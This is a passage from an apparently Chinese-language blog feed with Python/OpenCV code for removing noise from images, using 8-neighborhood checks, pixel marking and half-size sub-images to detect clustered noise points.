class="number">1</span> + x][j - <span class="number">1</span> + y] += <span class="number">1</span></span><br><span class="line">            <span class="comment"># 处理特殊值</span></span><br><span class="line">            <span class="comment"># sx, sy = special_check(_8_area)</span></span><br><span class="line">            <span class="comment"># if sx != -1:</span></span><br><span class="line">            <span class="comment">#     result[i - 1 + sx][j - 1 + sy] += 1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 不考虑缩小二分之一图像</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mark</span>(<span class="params">pixel_channel</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(pixel_channel.row):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(pixel_channel.col):</span><br><span class="line">            <span class="keyword">if</span> pixel_channel.noise[i][j] &gt;= threshold:</span><br><span class="line">                pixel_channel.channel[i][j] = <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> pixel_channel</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 找到最合适的值</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_best</span>(<span class="params">pixel_channel, x, y</span>):</span></span><br><span class="line">    p = pixel_channel.channel[x][y]</span><br><span class="line">    <span class="comment"># 建立领域列表</span></span><br><span class="line">    neighborhood = []</span><br><span class="line">    <span class="keyword">if</span> pixel_channel.row &gt; x - <span class="number">1</span> &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.col &gt; y - <span class="number">1</span> &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.noise[x - <span class="number">1</span>][</span><br><span class="line">        y - <span class="number">1</span>] &lt; threshold:</span><br><span class="line">        neighborhood.append(pixel_channel.channel[x - <span class="number">1</span>][y - <span class="number">1</span>])</span><br><span class="line">    <span class="keyword">if</span> pixel_channel.row &gt; x - <span class="number">1</span> &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.col &gt; y &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.noise[x - <span class="number">1</span>][y] &lt; threshold:</span><br><span class="line">        neighborhood.append(pixel_channel.channel[x - <span class="number">1</span>][y])</span><br><span class="line">    <span class="keyword">if</span> pixel_channel.row &gt; x - <span class="number">1</span> &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.col &gt; y + <span class="number">1</span> &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.noise[x - <span class="number">1</span>][</span><br><span class="line">        y + <span class="number">1</span>] &lt; threshold:</span><br><span class="line">        neighborhood.append(pixel_channel.channel[x - <span class="number">1</span>][y + <span class="number">1</span>])</span><br><span class="line">    <span class="keyword">if</span> pixel_channel.row &gt; x &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.col &gt; y + <span class="number">1</span> &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.noise[x][y + <span class="number">1</span>] &lt; threshold:</span><br><span class="line">        neighborhood.append(pixel_channel.channel[x][y + <span class="number">1</span>])</span><br><span class="line">    <span class="keyword">if</span> pixel_channel.row &gt; x + <span class="number">1</span> &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.col &gt; y + <span class="number">1</span> &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.noise[x + <span class="number">1</span>][</span><br><span class="line">        y + <span class="number">1</span>] &lt; threshold:</span><br><span class="line">        neighborhood.append(pixel_channel.channel[x + <span class="number">1</span>][y + <span class="number">1</span>])</span><br><span class="line">    <span class="keyword">if</span> pixel_channel.row &gt; x + <span class="number">1</span> &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.col &gt; y &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.noise[x + <span class="number">1</span>][y] &lt; threshold:</span><br><span class="line">        neighborhood.append(pixel_channel.channel[x + <span class="number">1</span>][y])</span><br><span class="line">    <span class="keyword">if</span> pixel_channel.row &gt; x + <span class="number">1</span> &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.col &gt; y - <span class="number">1</span> &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.noise[x + <span class="number">1</span>][</span><br><span class="line">        y - <span class="number">1</span>] &lt; threshold:</span><br><span class="line">        neighborhood.append(pixel_channel.channel[x + <span class="number">1</span>][y - <span class="number">1</span>])</span><br><span class="line">    <span class="keyword">if</span> pixel_channel.row &gt; x &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.col &gt; y - <span class="number">1</span> &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.noise[x][y - <span class="number">1</span>] &lt; threshold:</span><br><span class="line">        neighborhood.append(pixel_channel.channel[x][y - <span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 搜索与给定点最接近的非噪声点</span></span><br><span class="line">    <span class="comment"># 建立差值列表</span></span><br><span class="line">    d = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(neighborhood)):</span><br><span class="line">        d.append(<span class="built_in">abs</span>(<span class="built_in">int</span>(neighborhood[i]) - <span class="built_in">int</span>(p)))</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(d) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> p</span><br><span class="line">    min_index = d.index(<span class="built_in">min</span>(d))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> neighborhood[min_index]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 考虑缩小二分之一图像</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">repair</span>(<span class="params">pixel_channel, half_channel</span>):</span></span><br><span class="line">    <span class="comment"># 左上角</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(half_channel[<span class="number">0</span>].row):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(half_channel[<span class="number">0</span>].col):</span><br><span class="line">            <span class="keyword">if</span> half_channel[<span class="number">0</span>].noise[i][j] &gt;= threshold:</span><br><span class="line">                pixel_channel.noise[i * <span class="number">2</span>][j * <span class="number">2</span>] += half_channel[<span class="number">0</span>].noise[i][j]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 右上角</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(half_channel[<span class="number">1</span>].row):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(half_channel[<span class="number">1</span>].col):</span><br><span class="line">            <span class="keyword">if</span> half_channel[<span class="number">1</span>].noise[i][j] &gt;= threshold:</span><br><span class="line">                pixel_channel.noise[i * <span class="number">2</span>][j * <span class="number">2</span> + <span class="number">1</span>] += half_channel[<span class="number">1</span>].noise[i][j]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 左下角</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(half_channel[<span class="number">2</span>].row):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(half_channel[<span class="number">2</span>].col):</span><br><span class="line">            <span class="keyword">if</span> half_channel[<span class="number">2</span>].noise[i][j] &gt;= threshold:</span><br><span class="line">                pixel_channel.noise[i * <span class="number">2</span> + <span class="number">1</span>][j * <span class="number">2</span>] += half_channel[<span class="number">2</span>].noise[i][j]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 右下角</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(half_channel[<span class="number">3</span>].row):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(half_channel[<span class="number">3</span>].col):</span><br><span class="line">            <span class="keyword">if</span> half_channel[<span class="number">3</span>].noise[i][j] &gt;= threshold:</span><br><span class="line">                pixel_channel.noise[i * <span class="number">2</span> + <span class="number">1</span>][j * <span class="number">2</span> + <span class="number">1</span>] += half_channel[<span class="number">3</span>].noise[i][j]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(pixel_channel.row):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(pixel_channel.col):</span><br><span class="line">            <span class="keyword">if</span> pixel_channel.noise[i][j] &gt;= threshold:</span><br><span class="line">                pixel_channel.channel[i][j] = find_best(pixel_channel, i, j)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> pixel_channel</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="comment"># 图像地址</span></span><br><span class="line">    img_address = <span class="string">&quot;img_noise.png&quot;</span></span><br><span class="line">    <span class="comment"># 以BGR方式读入图像</span></span><br><span class="line">    img = cv.imread(img_address, <span class="number">1</span>)</span><br><span class="line">    cv.imshow(<span class="string">&quot;img_noise.png&quot;</span>, img)</span><br><span class="line">    <span class="comment"># 通道分离</span></span><br><span class="line">    channel_b, channel_g, channel_r = cv.split(img)</span><br><span class="line">    <span class="comment"># 建立像素通道类</span></span><br><span class="line">    b = create_pixel_channel(channel_b)</span><br><span class="line">    g = create_pixel_channel(channel_g)</span><br><span class="line">    r = create_pixel_channel(channel_r)</span><br><span class="line">    <span class="comment"># 缩小二分之一</span></span><br><span class="line">    <span class="comment"># half_b = [half_1(b), half_2(b), half_3(b), half_4(b)]</span></span><br><span class="line">    <span class="comment"># half_g = [half_1(g), half_2(g), half_3(g), half_4(g)]</span></span><br><span class="line">    <span class="comment"># half_r = [half_1(r), half_2(r), half_3(r), half_4(r)]</span></span><br><span class="line"></span><br><span class="line">    fp = <span class="built_in">open</span>(<span class="string">&#x27;b.noise.csv&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(b.row):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(b.col):</span><br><span class="line">            <span class="built_in">print</span>(b.noise[i][j], file=fp, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;,&quot;</span>, file=fp, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>, file=fp)</span><br><span class="line"></span><br><span class="line">    fp = <span class="built_in">open</span>(<span class="string">&#x27;b.pixel.csv&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(b.row):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(b.col):</span><br><span class="line">            <span class="built_in">print</span>(b.channel[i][j], file=fp, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;,&quot;</span>, file=fp, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>, file=fp)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 不考虑二分之一图像</span></span><br><span class="line">    new_img = cv.merge((mark(b).channel, mark(g).channel, mark(r).channel))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 考虑二分之一图像</span></span><br><span class="line">    <span class="comment"># new_img = cv.merge((repair(b, half_b).channel, repair(g, half_g).channel, repair(r, half_r).channel))</span></span><br><span class="line"></span><br><span class="line">    cv.imwrite(<span class="string">&quot;denoised_img.png&quot;</span>, new_img)</span><br><span class="line">    cv.imshow(<span class="string">&quot;denoised_img.png&quot;</span>, new_img)</span><br><span class="line">    cv.waitKey()</span><br><span class="line">    cv.destroyAllWindows()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 图像处理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> opencv </tag>
            
            <tag> 图像处理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>图像处理20210509</title>
      <link href="/20210509-img-report/"/>
      <url>/20210509-img-report/</url>
      
        <content type="html"><![CDATA[<h2 id="待解决问题"><a href="#待解决问题" class="headerlink" title="待解决问题"></a>待解决问题</h2><p>多个噪声点在一起时，难以消除</p><p>所以利用缩小二分之一的子图来检测噪声</p><p>如图为图像素材：</p><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111011555147.png" alt="img_noise"></p><h2 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python3.8</span></span><br><span class="line"><span class="comment"># utf-8</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">1.将图片缩小二分之一：</span></span><br><span class="line"><span class="string">    分别取左上角、右上角、左下角、右下角的像素点</span></span><br><span class="line"><span class="string">    生成四个子图</span></span><br><span class="line"><span class="string">2.找出噪声点：</span></span><br><span class="line"><span class="string">    划分方法一</span></span><br><span class="line"><span class="string">    划分方法二</span></span><br><span class="line"><span class="string">    标记次数</span></span><br><span class="line"><span class="string">3.修改</span></span><br><span class="line"><span class="string">    找最接近的未标记过的点</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> cv2 <span class="keyword">as</span> cv</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">threshold = <span class="number">4</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PixelChannel</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, channel, noise, row, col</span>):</span></span><br><span class="line">        self.noise = noise</span><br><span class="line">        self.channel = channel</span><br><span class="line">        self.row = row</span><br><span class="line">        self.col = col</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Part</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, x, y, area</span>):</span></span><br><span class="line">        self.x = x</span><br><span class="line">        self.y = y</span><br><span class="line">        self.area = area</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"># 将图像缩小到一半</span></span><br><span class="line"><span class="string">def half(pixel_channel):</span></span><br><span class="line"><span class="string">    row = pixel_channel.row</span></span><br><span class="line"><span class="string">    col = pixel_channel.col</span></span><br><span class="line"><span class="string">    half_row = row // 2</span></span><br><span class="line"><span class="string">    half_col = col // 2</span></span><br><span class="line"><span class="string">    channel = np.zeros((half_row + 1, half_col + 1), dtype=type(pixel_channel.channel))</span></span><br><span class="line"><span class="string">    for i in range(0, row, 2):</span></span><br><span class="line"><span class="string">        for j in range(0, col, 2):</span></span><br><span class="line"><span class="string">            channel[i // 2][j // 2] = pixel_channel.channel[i][j]</span></span><br><span class="line"><span class="string">    result = PixelChannel(channel, noise_check(channel), half_row, half_col)</span></span><br><span class="line"><span class="string">    return result</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 取左上角</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">half_1</span>(<span class="params">pixel_channel</span>):</span></span><br><span class="line">    row = pixel_channel.row</span><br><span class="line">    col = pixel_channel.col</span><br><span class="line">    half_row = row // <span class="number">2</span></span><br><span class="line">    half_col = col // <span class="number">2</span></span><br><span class="line">    channel = np.zeros((half_row + <span class="number">1</span>, half_col + <span class="number">1</span>), dtype=<span class="built_in">type</span>(pixel_channel.channel))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, row, <span class="number">2</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, col, <span class="number">2</span>):</span><br><span class="line">            channel[i // <span class="number">2</span>][j // <span class="number">2</span>] = pixel_channel.channel[i][j]</span><br><span class="line">    result = PixelChannel(channel, noise_check(channel), half_row, half_col)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 取右上角</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">half_2</span>(<span class="params">pixel_channel</span>):</span></span><br><span class="line">    row = pixel_channel.row</span><br><span class="line">    col = pixel_channel.col</span><br><span class="line">    half_row = row // <span class="number">2</span></span><br><span class="line">    half_col = col // <span class="number">2</span></span><br><span class="line">    channel = np.zeros((half_row + <span class="number">1</span>, half_col + <span class="number">1</span>), dtype=<span class="built_in">type</span>(pixel_channel.channel))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, row, <span class="number">2</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, col, <span class="number">2</span>):</span><br><span class="line">            channel[i // <span class="number">2</span>][j // <span class="number">2</span>] = pixel_channel.channel[i][j]</span><br><span class="line">    result = PixelChannel(channel, noise_check(channel), half_row, half_col)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 取左下角</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">half_3</span>(<span class="params">pixel_channel</span>):</span></span><br><span class="line">    row = pixel_channel.row</span><br><span class="line">    col = pixel_channel.col</span><br><span class="line">    half_row = row // <span class="number">2</span></span><br><span class="line">    half_col = col // <span class="number">2</span></span><br><span class="line">    channel = np.zeros((half_row + <span class="number">1</span>, half_col + <span class="number">1</span>), dtype=<span class="built_in">type</span>(pixel_channel.channel))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, row, <span class="number">2</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, col, <span class="number">2</span>):</span><br><span class="line">            channel[i // <span class="number">2</span>][j // <span class="number">2</span>] = pixel_channel.channel[i][j]</span><br><span class="line">    result = PixelChannel(channel, noise_check(channel), half_row, half_col)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 取右下角</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">half_4</span>(<span class="params">pixel_channel</span>):</span></span><br><span class="line">    row = pixel_channel.row</span><br><span class="line">    col = pixel_channel.col</span><br><span class="line">    half_row = row // <span class="number">2</span></span><br><span class="line">    half_col = col // <span class="number">2</span></span><br><span class="line">    channel = np.zeros((half_row + <span class="number">1</span>, half_col + <span class="number">1</span>), dtype=<span class="built_in">type</span>(pixel_channel.channel))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, row, <span class="number">2</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, col, <span class="number">2</span>):</span><br><span class="line">            channel[i // <span class="number">2</span>][j // <span class="number">2</span>] = pixel_channel.channel[i][j]</span><br><span class="line">    result = PixelChannel(channel, noise_check(channel), half_row, half_col)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 建立像素通道类</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_pixel_channel</span>(<span class="params">img_channel</span>):</span></span><br><span class="line">    (row, col) = img_channel.shape</span><br><span class="line">    result = PixelChannel(img_channel, noise_check(img_channel), row, col)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 不考虑位置</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">division1</span>(<span class="params">_8area</span>):</span></span><br><span class="line">    result = [<span class="number">0</span>] * <span class="number">8</span></span><br><span class="line">    p1 = [_8area[<span class="number">0</span>][<span class="number">0</span>], _8area[<span class="number">0</span>][<span class="number">1</span>], _8area[<span class="number">0</span>][<span class="number">2</span>], _8area[<span 